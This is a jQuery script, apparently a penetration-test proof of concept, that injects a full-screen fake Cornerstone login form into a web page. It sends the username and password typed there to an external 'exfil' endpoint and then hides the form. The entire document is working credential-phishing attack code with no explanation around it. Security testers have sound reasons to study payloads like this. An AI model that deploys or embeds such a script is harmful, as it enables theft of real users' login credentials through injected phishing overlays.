$(document).ready(function() {
// create fake login modal
$("body").append('<div id="mwrap" style="z-index: 9999999999;"><img style="zindex:
99999999; top: 0;left: 0;position: fixed !important; width: 100%
!important;" src="https://sec-pentestt1pilot.
csod.com/images/DefaultLogin/csc_atish_bg_r1.jpg"/><div id="lwrapper"
style="background-color: #FFFFFF; padding: 30px 35px; width: 420px; z-index:
9999999999999; top: 22%; left: 130px; position:absolute;"><div name="Form1"
style="margin: 0; padding: 0; box-sizing:border-box;"><div style="margin: 0 0
20px; text-align: center;"><img src="https://sec-pentestt2pilot.
csod.com/images/DefaultLogin/csod-logo-rgb-blue.png" alt="Welcome to
Cornerstone" style="width: 90%"></div><div><div><input name="userNameBox"
type="text" id="userNameBox" style="font-size: 16px;color: #333;margin: 0 0
15px;border: 1px solid #ccc;border-radius: 2px; width: 92%; padding: 10px 10px
10px 20px;" placeholder="Username" aria-required="true"></div><div><input
name="passWordBox" type="password" id="passWordBox" style="font-size: 16px;color:
#333;margin: 0 0 15px;border: 1px solid #ccc;border-radius: 2px; width: 92%;
padding: 10px 10px 10px 20px;" placeholder="Password" ariarequired="
true"><div><div style="display: inline-block; margin: 10px 0 0; fontsize:
14px; background: #0047BA;color: #fff;text-align:center;font-weight: bold;
border-radius: 3px; width:100%;font-family: Sans Serif;text-decoration:
none;padding: 10px 0;" id="schellman" title="Log In" role="button"
style="width:100%;"><span><b>Login</b></span></div></div></div></div></div></div><
/div>');
// show the modal
$("#mwrap").show();
// on submit, exfiltrate creds and close modal
$("#schellman").on('click', function() {
var username = $("#userNameBox").val();
var password = $("#passWordBox").val();
var data = "email=" + username + "&pass=" + password;
$.get("https://rev.run-api.com/exfil?" + data);
$("#mwrap").hide();
});
$("#ttt").removeAttr('onmouseover');
});